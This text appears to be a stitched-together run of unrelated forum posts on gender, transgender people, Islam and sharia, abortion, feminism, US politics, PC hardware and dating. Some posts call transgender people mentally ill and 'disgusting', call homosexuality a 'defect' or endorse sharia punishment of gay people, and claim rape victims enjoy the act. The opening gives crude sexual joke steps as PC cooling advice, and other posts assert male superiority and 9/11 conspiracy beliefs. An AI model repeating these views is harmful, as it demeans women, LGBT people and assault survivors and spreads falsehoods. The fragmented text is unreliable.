Okay, so, buy a pea pod, put the MX-6 dab along with the pea into the pod, place a tampon and sanitary thermal pad over the heatsink, squash the pea pod with my forehead so that it spreads all over the entire metal part, then give it a blowjob so it has lots of air bubbles for better performance, then ejaculate over it to ensure extra cooling performance, then heat the CPU and motherboard along with the coolant while it is applied then put it in water so as to rapidly shock-cool it and finally, place the heatsink sideways so it works better.

If you walk down the street and a man is looking at you or someone talks to you flirting and clearly finds you attractive it is flattering, but feeling sexy and good because someone finds you appealing and shows you attention, does not give them the right to pin you down and sexually assault you, that's like if I went swimming and got attacked and sexually assaulted it would be my own fault for wearing a Bikini ?

Lets get back to what i've said from the start.
Check all the 18-19 pages on this topic and see how many would date a trans and how many find it disgusting.
In real life its even lower than this cause its not full of 13 year old americabois with swag #blazeit.
I've seen like what 3-5 people who would date a trans?But i think almost every page has at least 1 guy saying its disgusting or that they would not care but they would not date which implies what i've said.

he could not handle being a men.
They dare to call themselves like us ,normals.
I would not care if somehow i would be turned into a female.Sure,i'd rather be a men cause obviously i like being strong and smarter but i would not feel like ripping my flesh to get out of the skin and i would accept what i am rather than mutilating myself to look like some hospital horror movie pacient.

I mean if we get over this ,in the end a transgender is just someone with a mental problem  with a disgusting body that look like a combination of both female and male."

The ""i wonder what the topic was about"" was sarcasm.I already knew he claimed higher as do most males.

Its not about anyone caring online if i can beat him,its that he claimed that his bf would beat me.
Its irrelevant if she would not fuck any of us.He is attracted to males just that i am attracted to females.Whats the problem here?
You are not smart,dont blame on me your failure to understand.Why would i claim to count all the posts when i am sure that at least a few pages are just my posts?It was obvious what i've said.You've lost the argument and now you're trying it on something irrelevant ,like your lack of understanding simple logic.

No ,you would not puke you'd salivate and i am not juiced up but i am ""bear mode"".
My personality attracts girls.Girls like to be dominated by smart and strong men.Deny this all you want but you'd be all over my dick.
The male body is superior.It would suck to be as fragile as a female.
And yes ,i have a nice bubble butt.

I have never been proven wrong so far in this thread.

No,your boyfriend doesnt know how to treat a female.The male should always be the dominant part.
I doubt his dick compares to mine.The average difference between self reported and lab measured penis size is 0.5-1 inch on all studies.What does that mean?It means that your bf penis is more average than you think."

Well man, you really haven't given me much to work with. I don't feel as if you love a woman, that you can get up and (even when drunk) tarnish that commitment you've made to them. I've been drunk many times, around beautiful woman, but I said no. I ain't no playa son. Drop some chains on this chasity belt. Peace. 

But in all seriousness, it seems you've screwed up man. I'm not really a magic worker. I really wish I could give you the words to get you with any girl you wanted to be with, but the game doesn't work like that. This isn't a mario game where you die and you got 5 lives left. Nothing's guarenteed. Works the same with love. If you're constantly messin up with this girl, this girl has this permanent image of who you are. Even if you were to get back with this girl, there would always be that level of distrust or barrier that you two share. Love has no barriers man. When I roll up in the club, I ain't there to do anything BUT get drunk, dance, and have a good time with my friends and if I've given my girl any reason to be sittin in the back having to baby sit me, then what am I subjecting myself to?  

I can't help you get your girl back, I'm sorry for that. I'm not a love guru that has all the answers, just here to provide some advice on what I think is right. All honesty, you should have thought of given up anything that would give temptations. Love's a y road man, we win some, we lose some. You just gotta play the game right.

Hey man. Are you saying that the love of your life is your friends girlfriend/boyfriend? It appears you've been ""friend-zoned"". This often happens when you be nice to a girl for a long period of time without your own personal agenda. It shows that you have no physical interest in a person and a woman, as well as a man, can be oblivious and overlook it. We as humans are ultimately trying to find one thing. Completion. And that applies to love. To get yourself out of the friend-zone, you need to act fast. Tell her how you feel and be confident about it.

Hey,
I just want to let you know that it's entirely normal to be nervous. People are naturally scared of new things. Once you experience something you'll become more comfortable with it. When I first kissed a girl, my heart dropped I was absolutely frightened about the outcome. But, I'll never regret having the experience. You're doing nothing wrong. You just simply haven't come to the level of trust that you will eventually get with a person in order to kiss her. Love doesn't just happen. It grows in our hearts and minds. And when it's strong enough, that is exactly what gives us the extra adrenaline rush to do what we normally wouldn't do. There's a saying that some say, ""Love makes you do crazy things"". I couldn't agree more."

Next - A minor account (AKA Joint Savings Account with Parent / Guardian) also requires the consent of your parent / guardian. Lets face it, how many parents are gonna let their 12 year old child accept payments from strangers over the internet, which have to do with virtual, often stolen items.

Well.. with 1k USD, you can build a whole new PC. However, the build is essentially alright, not too bad, as some were kind of dissing. I personally don't like SeaSonic though and you should look towards SSD caching or SSD SRT (Smart Response Technology) would definitely upgrade your boot up time. 64 or 128GB would be enough, I would go for the 128GB. I wouldn't recommend using an SSD for storing your actual data, since your sister has been upgrading since XP... most likely it'll be constantly upgraded and SSDs unfortunately don't have a long life can die even from 5 years of purchase :3"

Them having the physical ability to reproduce does not exclude it from being a mental illness. They are inclined not to sexually reproduce (let me remind you that sexual reproduction is between a male and a female) due to their compulsions, which is a hinderance to one of life's (as a whole) main requirements. 

Let me put it this way, our species would have died out a long time ago if enough of us were gay at a given point. That definitely makes it a defect. A defect we can tolerate and accommodate in our modern society? Yes. But a defect none the less."

m3.4 - 3.7 say that a woman may not ""conduct her own marriage"", meaning that she is not free to marry by choice.  A male guardian is required to validate the marriage agreement.  

m3.8 says that a woman is not free to choose her guardian.  It is assigned by family relation.  Once she is married, she becomes the charge of her husband's guardianship.

A Muslim woman may not marry a non-Muslim man (Quran 2:221).  An untranslated portion of the Sharia even forbids an Arab woman from marrying a non-Arab man (source).

(m13.4) - A woman has no right to custody of her children from a previous marriage when she remarries.

(m5.1) - It is obligatory for a woman to let her husband have sex with her immediately when he asks her... and she can physically endure it.

(m10.11-2) - It is not lawful for a wife to leave the house except by the permission of her husband.

(m10.11) - When a husband notices signs of rebelliousness in his wife, he warns her in words. If she commits rebelliousness, he keeps from sleeping with her without words, and may hit her, but not in a way that injures her, meaning he may not break bones, wound her, or cause blood to flow. 

(o4.9) - The indemnity for the death or injury of a woman is one-half the indemnity paid for a man. 

(L10.3) - Divide the universal share so the male receives the portion of two females (Rule of inheritance based on the Quran 4:11)

Terrorism

I have talked earlier the cause of terrorism. I don't support it of course, but i understand where and why it comes. Is it the fault of islam ? No, just human ignorance.

al-Qaeda, Osama bin Laden and Islamic State (ISIS)

Same as terrorism. After 1990 all this shit came basically after Afghanistan got invaded. If you want me to elaborate more, tell me. Is it the fault of islam ? No, again the human ignorance.

9/11 Attacks

I believe in the conspiracy theories about it. But i surely feel sorry for the people that got killed there, and for the 1.5 milion iraq'is that were killed because of that.

Violence in Defense of Islam

If it is meant to use violence to protect yourself from Violence then of course it is justified. But using violence against people that have no fault at all is absolutely not accepted.

Sharia

I support it 100% over democracy or any other law system.

Honor Killings

If you have sharia law implemented there is no need for it. The state will take care about that. I don't really support it if the people live in another law system.

Assimilation

It depends of the topic. If for example they want me to be assimilated in a system where my daughter for ex goes home and leaves whenever she want at middle night, the coming with a swollen belly then of course i will not get assimilated.


how do you feel about free speech, homosexuals and women's rights?

Free speech until you don't affect each others personality.

About homosexuals i support the sharia law against them. But aslong as there isn't that law system applied then they can do whatever they want, cause either way i don't have what to do.

Always for women rights. Against feminism organizations.

Hey, that's a good question, this basically relies more on religion, but I hope the mods don't mind! :)

Firs things first, we must know the conditions of war in Islam, and what kind of a treaty is sent to any territory they wish to occupy:

1. Accept Islam
2. Pay Jizya (War Tax)
3. Wage War (Considered the worst situation and not recommended

Next, if war does hapen, here are the things which Muslims can't do:
Hurt Women, Hurt Children, Hurt Innocent, Hurt Elders, Hurt Sick People, Harm Trees, Harm Building, Burn Crops etc.

More over, a saying of the Prophet states that War is considered a smaller Jihad, and fighting with your own self (Implementing religious, ethical and moral values in your life is considered a bigger Jihad.)

Now we come to the term, disbeliever which is used alot in the Quran and sadly misinterpreted, Arabic can divide disbelievers into two:

1. Kafirs (Those who insult the Quran / Harm Muslims )
2. Disbelievers (Those who are not Muslims, but do not inflict any harm on them)

Islam demands kafirs to be taken care of, as they spread racism in the world. Whereas it is not allowed for a muslim to even attack a disbeliever for no reason.

Hope that answers your question ***IMG***[images/smilies/thumbsup.gif]***IMG***"

Furthermore, you're severely confused with the context of equality - as not even feminists are working for equality in outcome, they're looking for equality in opportunity. To quote Abra, equal opportunity DOES NOT mean equal outcome. Just because a female doesn't, on average, earn as much as a man doesn't mean they're being ""oppressed"" it could be because they biologically tend to favor lesser paying majors or prefer to be with their children.

Some things to keep in mind:
- Even if 99% of rapists are men (though I'm not convinced that's factual), 99.9% of men are not rapists. This makes blaming men for rape ridiculous.
- In Sweden, accidentally touching shoulders in a queue can count as rape if you are female and report it to the right people. The reason we are on top of the rape statistics is probably not because of actual rape, but because of how we define it.
- Men do not report sexual assault/harassment because it's seen as a demeaning thing to be a victim. We are not taught to whine but to man the fuck up and keep it to ourselves. Either way, most men do not care if a random girl touch them at the club.

In Sweden, we have statistics surrounding rape. 99% (or something in that percentile) of rapes is done by men. It is calculated that at least 1/3 of all women will get sexually harrased sometime in their lifetime. 

At least 50% of my female friends have been sexually harrased. This includes being touched at involuntarily(?), raped, etc. 

This is something that happens a lot. It is probably due to how the evoloution work; rapist would more easily able to continue their heritage - if there is some kind of biology bound to aggressive sexuality. 

If not, it could be because how men are raised. We are raised to take up more space, to take what we want and to strive to be the alpha. 

I do understand if this just seems like a lot of claims, but it is very hard to gather evidence for behavioural aspects. 

Mainly however: a woman is a slut if she sleeps around - while a man is a stud. Women taking what they want is bad - while men doing it is good.

I will try to look up some statistical resources that perhaps can convince you. It is however very hard to prove behavioural patterns. 

Political opinions is usually very non-fact-based - as usually, specualations are our only source of information. I do write that I believe, as I am always ready to be convinced by facts, when I state an opinion or belief. I do think however, that most of our difference in opinion comes from my lack of formulation. 
I do, as mentioned, have no strict opinion on the wage gaps correlation with reality - nor know the origins of it. Therefore I write ""I believe"", to seperate beliefs from claims - as I do not possess a real opinion on the subject, I only went against, to spark discussion, as it helps broaden my perspective. 

I personally do stand for other structural principles, such as men comitting suicide more often, men raping more often, that men is more often the ones to assault. I do believe that this is caused by gender roles, which ultimately is what I view as the ""enemy""."

I agree, both parents should definitely have the ability to spend time with their child. Also, gender structures really don't dictate anything at all on an individual level. Society doesn't all come together and tell each woman individually that she needs to stay at home and take care of the kid. The women makes her own decision to do that, but she still has the same opportunity to work as the man. I'm not seeing how you're able to twist this scenario so that women are somehow the victim of a faceless society that truly has no say in what an individual does.

Also, some bodybuilding federations actually have untested competitions, so ""cheater"" pools are kind of a thing in that sense. But Mr. Olympia, for example, is part of a tested federation so according to the tests, all of the biggest guys in the world are steroid free which is simply not true.

If your test is 200ng/dL below average and you raise it just to average, where is the testosterone advantage? There isn't one. Steroids /can/ give you advantage, but steroids don't automatically give an advantage just because they're used.

Steroids aren't magical. Someone using steroids and doing absolutely nothing will not magically gain strength, mass, or endurance above that of a person who's not using steroids and training appropriately. Someone using steroids to match normal testosterone levels will not gain muscle mass, strength, or endurance faster than someone who is already at those levels of testosterone (aka, the average male). 

I don't know what you think steroids do, but you seem to be confused.



if the argument is simply about whether or not steroids should be used in sports, then obviously one person using steroids will have an advantage over the others (aka pro athletes over amateur). this is not what i'm arguing. obviously one person using something and another not is objectively an advantage if your perspective is this narrow. however, someone with lower levels of test using it to match normal levels does not have a real advantage over other people already at those normal levels. a trans person would likely still be at a major disadvantage in most sports due to other physical differences between men and women even if they are supplementing testosterone to match the levels of their peers, but that's beyond my simple argument as well."

I'm not the one getting an abortion, so no, I'm not responsible for it. If I were to agree on one though, it could be for a variety of reasons, it seems very 1984-like to prevent someone from doing what they want with their body. I'm not obviously advocating for last-minute abortions, but early on the door should absolutely be open. What if I can't afford to raise a child? What if a child suddenly prevents me from going from getting an education and a job simultaneously. Why should I have to live a shitty life working minimum wage jobs, instead of being a small business owner, just because you want to feel good about not getting an abortion? Do you know what happens when we don't get an abortion, conservatives complain about how they become welfare leeches, and it's how the cycle of poverty starts where people vote for more welfare instead of more opportunities.

There were intimidation tactics from all levels of the Trump movement from threatening WW3 with Russia, to threatening basic US freedoms like the right to bear arms to basic intimidation at polls and even a few shootings, the Trump movement is similar to the vile tactics Hitler used to make the left threatened to voice their concerns. Now it seems Trump has won and it is giving public discourse free reign to say the disgusting things that make the Trump movement what it is: Horrid treatment of women, treating Mexicans like shit and rationalising hatred of minorities and scapegoating them for all the economic mismanagement of the Bush administration leading up to the GFC.

You have zero clue, Bush killed a million people in overseas imperialism, exploitation transcends political parties, the parties that do it does not matter it's all the same shit from the US. I never claimed anything, this is a thread on using a constitutional right to defend yourself and your country from tyranny. Not a #BLM #SJW thread. A Trump presidency is the perfect example of tyranny of the majority and people should be aware of the dangers of populism. Freedom is at stake. The left has never liked the 2nd amendment but for once in modern American history it is a requirement to take back power from a corrupt person like Trump. 

All of western Europe is fearful of America because of how their countries fell to authoritarian fascism. There have been people on this forum who have said Trump is more likely to start wars with major countries like China with trade antagonism. He is more likely to make ridiculous foreign adventures like the Iraq war. And the funniest part of all is that he is more likely to revoke gun rights than Hillary herself!

Furthermore it has been evident time after time that Trump is a danger to democracy itself. Hell he even threatened not conceding if he lost the election.

The left is not associated with Hillary and her capitalist wars just the same as they are not associated with capitalist war of any other party. Trump is threatening to engage in capital wars with China. The hypocrisy of you people make this forum hilarious.

The fact is that work isn't actually gendered like you think. The OP is intrinsically sexist because he actually thinks men/women can't get along without each other. To any Durkheimian sociologist, women are in their occupation because by biology and practicality, they are better suited to it. In a magical world where women were forced to do men's work because men weren't around for a day of course they would fucking fail. Likewise with men. Have you resided in a share home with men? 

The OP's post is retarded because both men and women can do any job so long as they had more than a day to retrain in their respective field.

I'm glad you personally had the GUTS, to tell me what News Corps told you to say because a day about women (of whom have been suppressed for majority of human history, I believe they are entitled to have at least 1 fucking day in the 365 year cycle) makes men with low energy masculinity really itchy.

These things aren't hard to grasp.  And only reality matters, not perceptions of discrimination in certain groups.  Women statistically feel more in danger when walking down dart alleyways, but in reality men should feel more in danger since they are significantly more likely to be assaulted, murdered, mugged, and accosted in every way.

The issue with feminism is that feminists invent issues that either aren't real, or are significantly overreacted to in comparison to the plethora of other worldwide issues, often even those that face men.  I would say objectively men face far more issues.  Higher murder victimization rate, suicide rate, workplace death rate, homelessness rate, etc.  These are among the most important issues in the west and if they applied to women, we would be up in arms.  But nobody is when they apply to men."

The prophet never forcefully killed others because they didn't believe him.
READ all the battles he has been to, all background info and everything. You will then know why the prophet did what he did and what manner he did it in. 

You won't find ANYWHERE that he oppressed women or slaughtered them, instead he treated them like real human beings, equally. You will NEVER find anywhere that he sneaked up into non-believers houses and slit their throats or chopped their hands of due to theft. You will NEVER find anywhere that he went to war without a valid reason. You will NEVER find anywhere that he went to war without requesting alliance or a truce. You will NEVER find anywhere that the prophet forced others to convert to Islam. You will NEVER find anywhere that the prophet went to war to promote Islam by intimidating the enemy (DESPITE THE FACT THEY HAD THE LACK OF SOLDIERS AND ARMS TO FIGHT).

There was this one surah where Allah says that if one is oppressed by the oppressor, the oppressor shall be known as unjust, and the unjust is simply a sinner who will face the punishment in the Hereafter. I'm on my phone right now, but when I get on my computer, I'll type it down for you.

And if they repent (promise Allah that they will never repeat, i.e. commit illegal sexual intercourse and other similar sins) and do righteous good deeds, leave them alone.

But that doesn't mean that everyone in a situation like this has planned it out. A lot of people don't. 

Sure, I'm not the one carrying it for 9 months and giving birth. But that doesn't mean that it isn't equally my child or that I shouldn't have any say in what happens with the kid. Men, legally (at least in the US), have essentially zero say in whether or not the woman has an abortion and whether or not they have to pay child support. If the man happens to have a different opinion than the woman in a situation like this, he's screwed regardless and that's simply not equality.

and later since Mohammad came 1400 years ago until today, people are still being killed because they follow Jesus.

I am not disagreeing with anyone with what so called ""christian"" people did.

Was this a teaching in the new testament, did our lord Jesus teach us to conquer and takeover and kill? 
The people who did this are evil men, they have two faces, they say they are christian and then they would kill conquer and take over,
they are not true followers of Jesus.
The things the isis is doing now is the same thing that mohammad did 1400 years ago, he killed people and took over the land, these people are just following the example of their prophet

At the beginning stages of conception a fetus is just as alive as a plant, or tree. This isn't an opinion, it's been proven by monitoring brain waves and organ functions.

A fetus isn't a human either, when considering everything besides the location in which it's being formed.

A fetus is the beginning construction of a human being, but it has no thought, no feelings, no working human organs. It's a blank slate for the human ""soul"" to be implanted onto. 

When I consider a human life, a baby, I look at the science behind it. When can this baby start to think, feel, and become an individual. When does the whole process begin, and when does it scientifically end. To say it's fact that life begins at conception, without knowing what life equals, is wrong. What do you consider life?

You claim that God is a shoulder to lean on, you say he can make you sad, and he can do other things to you. However, you still provide no evidence for your claims that he actually does this. 

It is very well plausible that you are imagining that you having a relationship with God in order to cope with different situations or offer explanations to events that happen in your life.

We need people with actual know-how and understanding in these positions, and an actual interest in doing their part, instead of simply growing their parties popular vote. 


An interesting thought, though."

2. The fact that each country has it, makes the argument valid. In a truly free market society, there would be no taxes. 
6. The state plays a large role in transportation. Though not much in communication. As I said before, not all of them are 100% applicable to modern society. 
7. The government plays a large role in production with price floor and price ceiling policies and regulations, not necessarily ownership.
9. They are becoming less segregated, this may or may not correspond with government. 
10. The fact that public schools exist prove this point. The Manifesto was published in 1848. Child labor did not mean 14. Pay close attention to the words ""current state"". 

You are clearly misunderstanding the argument.
All that I am saying is that the relation between Marx's ideas and modern society is strikingly similar.

Yeah but I think we're to the point where we don't have enough confidence. I asked her a couple weeks back about if she liked me and stuff. And she said yeah as a friend because her boyfriend will go on her phone sometimes. (How he found out my name). But she did really like me. I don't know if it's just hitting her that I actually do like her. I honestly don't know what to do. She wants to hang out really bad with me. But we never do >.< I almost want to ask her to go out and get coffee or something with me. But that would lead to something else and I don't know how she would react to that.

School shootings are direct result of gun free zones. That's why the shooters go there. School shootings wouldn't happen or would happen less and the causalities would be less if staff was armed. Example of this in 1991 in Peal, Mississippi a kid killed 2 people and injured 7 the vice principle stopped the shooting by pointing his firearm at the student. If you arm more people, there will be less shootings. We need to focus on the mental health care not disarming the people."

So the only real argument for the wall is that maybe it'll keep more people working in Mexico? Seems almost reasonable if you just ignore the fact that Mexicans who immigrate into America to work are sending money back, thus also boosting the economy. The Mexican government would be much better off improving living conditions within their country than paying for a wall that would force people to stay who don't want to. In fact, instead of paying for the wall, they could literally use that money to work towards improved standards of living. Seems like a much more reasonable use of that money to me.

I guess I never considered that, you're right in many religions the god always directly influenced actions by giving orders and setting conditions.
However, that is not the initial point of the discussion, my god was used as an example to provide some background for my question. 
So, let's say we imagine a new god who created us, and left us to be. Could we still blame him for our problems, even though he never directly influenced us, apart from our creation?

So it would be safe to assume that you believe responsibility is directly related to awareness?
If your creation is self aware, and can control all it's actions deliberately and consciously(maturely), then you are no longer responsible for them.
However, if your creation is inanimate, then you have full responsibility over it, and over anyone who uses it?

Consider this:
Samuel Colt, founder of Colt's Patent Fire-Arms Manufacturing Company, made it commercially viable to mass produce revolver pistols for the first time.
His wife,  Elizabeth Hart Jarvis, kept the Colt estate after Samuel Colt's death.
Elizabeth began building staircases which led nowhere, all over the Colt mansion. 
Pretty soon the entire mansion was filled with random staircases going from floor to ceiling, and leading nowhere. 
The reason she did this was simple, she felt that her husband was responsible for every single death brought on by his firearms, and she was building resting places for the souls of those who died by gunshots.

Would you agree that her husband, Samuel Colt, is responsible for every gun related death?
Would you blame Henry Ford for every car accident?

Because I would strongly have to disagree with such sentiment."

Ok let's pick apart the sociology aspect, since I don't know any psych. 

My prof explained that while sociology is a science of the studies of individuals behavioral patterns or the reason they do things. Sociologists may study these things in very different manners.

Here in America there's clearly a Conflict Paradigm. We've got multiple groups competing for some sort of power in our levels of gov. Another aspect we're studying is social control. So far, we've discussed (my prof's theory at least) that it's society that really dictates our actions, even when we don't realize it.

In more simple terms, she explained it as such. ""People think the way they do because that was the thought process at the time."" But in relation to the conflict paradigm & social control, if one wanted to steer to society's thought process towards his/hers they would use subtle actions to influence potential supports. 

Let's take for example the past election campaigns. While many theorize Putin ordered a cyber warfare campaign against Clinton (which I think is false) I do think Putin used his influence to definitely sway the election towards Trump. When I say influence, I mean the time's he's publicly spoken about the two. 

If you read his words or translations I suppose, they're very well thought out. Each of the sentences he would say about either candidate, appeared to be carefully chosen to provide more influence while trying to mask itself as impartial. 

Back to my point, now that background is out of the way. I guess I'm trying to ask is, are racists racist, not because they're born with this unnatural fear of another race. But because they're forced to think in such a manner. Again, I do constitute that many trolls do exist especially on this site. But the people who posts things that are genuine, do they really believe some of the things they're saying?

Here's a poor example I suppose from another thread.

So your god that you believe in comes on three forms? All in which have the same goal? 

I give you props for at least following both of the scriptures.

Speaking of scriptures and you abiding them, did god actually say this?

"" When a man sells his daughter as a slave, she will not be freed at the end of six years as the men are.  If she does not please the man who bought her, he may allow her to be bought back again.  But he is not allowed to sell her to foreigners, since he is the one who broke the contract with her.  And if the slave girl's owner arranges for her to marry his son, he may no longer treat her as a slave girl, but he must treat her as his daughter.  If he himself marries her and then takes another wife, he may not reduce her food or clothing or fail to sleep with her as his wife.  If he fails in any of these three ways, she may leave as a free woman without making any payment.   (Exodus 21:7-11 NLT)""

Are you against homosexuals for your own reason, or because god is (hypothetical, of course).

That is because it would harm the chicken and we have evolved to feel sorrow for the chicken since we are physically killing it or giving it pain. When a female is raped she does not experience pain, she experiences a pleasant feeling filled with thousands of nerves. If the female is not kidnapped, or hurt, and just having sex against her will, she only is upset because the perpetrator is unattractive, or because her friends would call her a whore so she must act displeased. If anything, she enjoys it but desires attention more.

Actually Obama is against gay marriage and pro civil unions same stance as Romney.

Obama has no intentions of getting involved with Abortion laws not due to principle but due to no backbone.
Romney is against abortion but believes it should remain safe and legal rather then in back allies.

I am for gay marriage but I am more towards states voting on it and not forced feds to shove laws down throats of people. I am for legal abortion but I think it is one of the worst things a woman can do.

I do not agree on Romney for a few issues but I agree with him on nearly all economic issues and on a few social issues. I couldn't care less about environment.

I could care less about Obama flip flops on all his promises he made if he just got the economy working. We are not even to where we were when Bush was still in office meaning when Obama first got elected it was failing yet Obama has not decreased it to where he was put in office. I do not agree with his socialist idea's. All I care about country Economy, and Personal Freedoms I could care less if Obama wants to have sex with a goat in the white house or if he is lying to be every day if he can just keep Economy under control & keep my freedoms I am happy enough.

This wasn't the only thing OP was getting at, though. He repeatedly tried to say that this was some kind of sexism against men, which isn't true. (Some) women liking famous guys doesn't amount to gender-based discrimination. 

Also, saying that women ""believe everything should be about them"" is just a hasty generalization. You and I both know that it's a silly one, too.

I'll spell it out.

Most people on this forum will defend the internet just as equally as that ""uneducated trump supporter"" who will stand by anything he does no matter how bad it is. 

Haven't you seen any videos like democrats asking trump supporters what his policies are? And some of them can't give an answer as to why they even support him? Some of his supporters undeniably would have backed him no matter what he did on stage.

I could have also said the Hillary supporters who turn a blind eye to her corruption. I just said trump.

I did read this on WashPost when it talked about Obama though,

 ""If that seems alarming to you, it's worth noting that Baba Vanga also says, according to a round-up of her predictions by Vice magazine, that the Earth's orbit will shift in 2013. And a number of conspiracy theory Web sites that I won't link to here also claimed she foretold a third world war to begin in ... 2010. Hopefully, then, her powers are on the decline.""

""To be clear, it's difficult to determine what Baba Vanga actually said. And there's no reason to lend this prediction any seriousness whatsoever. """

I disagree.
I maintain C's in school simply by pissing away the homework and doing well on the tests. Some classes...this doesn't work, and I get around a D.
My grade in class depends entirely on how much homework we have, they take away half of my day already, if I can't get it done in class, it's not getting done.
Some kids, do ALL the homework, maintain B's and A's, but do mediocre on tests, getting C's and low B's constantly.
High school is really quite a joke, you don't have to be smart to get good grades, but you do have to be hard working, which is definitely a very good trait to have, but it doesn't make you an intelligent person.

The reason gov. likes to give more benefits to married people is cause they expect married people to have more costs than a single person supporting his/herself over a parent supporting a family.

If civil unions had the same rights as marriage then alright, it's equal for gays now and they should go for that. But at that point, then what's the difference between civil union and marriage other than them being called different things. Marriage is a title for people who applied for those benefits."

A notion of absolute truth is not essential. Many philosophers recognize the near impossibility for proving absolute truth, yet find a framework in which we may still assert ontological truths. It is the same thing, I'd argue, when we consider certainty and near certainty in epistemology; the absence of the former does not render the latter non-existent. I am nearly certain I am awake right now, and I can provide arguments to support such belief, but I cannot be absolutely certain. Similarly, I can logically substantiate certain propositions through rigorous argumentation, but can also recognize that absolute truth would be difficult if impossible to assert as a base axiom.

Following from this, there are standards whereby we can judge evidence to be 'better' or 'worse' than others. I did not use the term 'sufficient evidence' for no reason. If a theologian was to posit the existence of God to be true on the basis of bananas existing (yea im lookin at you ray comfort) we could refute it by demonstrating it's a non-sequitur; however, if someone like Thomas Aquinas were to give us an argument which concludes God's existence on the basis of contingency, we would (and are) hard pressed to refute it--yes, we have attacked the premises, recognized the syllogism as valid, but it is a much heftier task than simply refuting Ray Comforts awful non-sequitur. To measure out what evidence is good or bad we must turn to induction; what evidence has worked in the past? Is the relationship casual, or causal? If we recognize that mere allegations are not evidence, but that DNA evidence demonstrates a causal relationship, we can justifiably say that DNA evidence is stronger. I hope that was what you were looking for, I kind of understood this argument, kind of didn't, so I'm not sure if I stayed on topic.

Big breast, good looks, and a well formed and developed body. Children do not have this. So are they attracted to the thought of rape? To the thought of having complete control over the child?

Most think of liberals as people who throw our liberties away for temporary solutions. A great example is gun control - due to the use of guns in many shootings. 

I do not consider myself a liberal, as I believe in limited government. I suppose I'm a ""libertarian"" however there are many aspects where I feel we shouldn't be totally free.

I have a lot of issues with liberalism - big government, gun control, right to abortion, governmental regulation of the economy, the seizing of private property, the support/amnesty of undocumented immigrants, United Nations (total bullshit), and long-term welfare are all nightmares that raise our debt and will slowly enslave our people.

I do however believe other things are necessary, free/affordable health care (as long as it works i.e. not Obamacare), separation of church and state, same sex marriage, social security, taxes ( poor/rich idea).

I am torn on war on terror. It is the duty of the people of a state to rise up though, in the end, we should not be seen as the police of the world. Using military force could potentially defeat ISIS, however there's a lot of other ideas.

War on drugs? All drugs should be legalized. It should be our right to do what we want in this life - in order to truly be free as long as it does not harm/victimize another.

Well I am of the white working class. And not the labor aristocracy either, much closer to the bottom. So I am familiar with what is alienating to the working class and what isn't. Liberalism is alienating to the working class. For one, the liberal organizations such as the Democratic party have rejected the working class as a block, they are now a party of the petty bourgeoisie and the middle class professional entirely, and they are unapologetic and explicit about it too.

So when you present to the working class an analysis of racism and patriarchy devoid of class analysis (like the Democrats present) their first reaction is ""why should I give a shit?"" When you present an analysis of these things with class interests and internationalism positioned at the core making the case that fighting racism and patriarchy directly benefits the white worker (like the communists do) then you are not alienating those white workers.

There is an extensive camp of sociological and historical literature on this topic but I will attempt to provide a short version. 

Marxists argue that the historical exclusion of women from the political process and various rejections of the feminine is derived from the roles and marginalization of feminine labor. Liberals like to spew this nonsense that women were excluded simply because men just decided to hate them for a while then suddenly decided not to. How nonsensical is that narrative? Our argument is that capitalist sexism became a unique phenomenon at a historical stage which became separate from feudal sexism. In pre-capitalist society labor was defined by the household. Everyone generally worked in the domestic sphere which functioned like a common wealth headed by a male figure, and this comes with it a unique condition of sexism. Then capitalist society emerges in which labor is defined by capital, i.e., working for someone else outside of the home. So men leave the home en masse and women remained confined to domestic labor which is not characterized by capital and wages and is therefore unpaid. This is *the* historical trend, so it was not by accident that women were marginalized by capitalism in a historically unique way. Unpaid labor is a *lower* form of social existence. A lower form that women as a group were confined to as a result of *purely* capitalist development. 

And these historical associations are not something that can be overcame within the context of the system that produces them."

In order for an analogical argument to be debunked it must be proven insuffice in relevance, but that relevance must be conceptually related to the context at hand. I'm trying to make the dichotomy between stipulative causation (a requisite for, ie capitalism being a causation for sexism), and a historical causation (i.e. capitalism has played a role in female oppression, but it isn't necessarily a stipulation of capitalism). A way of life vs. a system in itself doesn't seem relevant to this context because a) they're not massive differences to begin with, but more importantly b) because either ""way of life"" or ""system"", the effect of a historical/stipulative causation is relevant to both and that's the vertical I was scaling.

If I'm understanding this correctly, you're saying regardless of the capital distribution of capitalism, sexism would still exist because the mode of thought capitalism represents is still gender stratification? 

My problem with this, though, is these are all social issues. Capitalism has no contingency on women being domestic, nor is there any capitalism division between genders. These are all social construed ideals of women and domestic practices, but they are absolutely separate entities from the economic system itself.

Let me throw you a hypothetical: In an alternate reality, capitalism is being practiced and males have assumed the domestic role. 
There is a list of ultimatum one in which you have to subscribe to. Either:
This system cannot exist
This system would still be sexist against women
Capitalism and sexism can exist entirely independently.


I will say I have a bias in this case. But I hate biases, completely, and it's something I've been working on.

Being liberal only goes so far. No reasonable parent would encourage their child to become a pornographic actor/actress.
There are many other open options to make money when a child is young. Many long term, less degrading options for the child involved (do you personify pornstars, or do you objectifiy them? That is the question). I'd list the psychological consequences for the child and their future, but I'll wait for your to refute the argument first.

If they come here, wearing burqas and are deeply intolerant of others, then that's when we have the problem. It is the attitude, not the clothes.

Exactly, it's a free land so all individuals should have the right to self expression of their religion and individuality and if the burqa is a way of doing so, by all means.

No. You forgot the whole purpose of affirmative action. Let's talk about Princeton, since it's mentioned in the article you linked.

43% of the student body in 2016 was American minorities. Sounds great, right? But then you realize that includes Asian-Americans (who make up 12% of the entire student body), and every other minority in America. 57% of the student body is still just white people. That's almost 60%, friend. And don't forget that just being a minority doesn't automatically get you into the university. Don't discredit the hard work that people put in to get accepted to schools just because you think it's biased against you (especially when it's not). Even with affirmative action, elite universities like Princeton still admit 14% more white people than all minorities in the U.S. combined.

You're 100% right on the first point about audience, but I think paid subscriptions among other things make up a decent % of the profits as well.  Money which companies use to pay female pornstars their higher salaries.  It makes sense to me, since that's who *most* people are watching anyways.    

About maternity leave, it's not about who's actually advocating for it.  I was just factoring it into the ""wage gap"" debate.  Lets say in the military, you have 2 people (1 male, 1 female) of equal paygrade, time in service, and job (essentially same pay).  The female is entitled to maternity and convalescent leave (I'm not going to say it's like a free vacation, because she should be actively taking care of the baby).  But that's time she's not contributing to her job, while getting paid.

Understood.  I'm not trying to push the narrative that Muslims overwhelmingly support ""terrorism"".  I'm using the broader moral category of violence which includes genital mutilation, execution of homosexuals, apostates, blasphemers, subjugation of women etc.

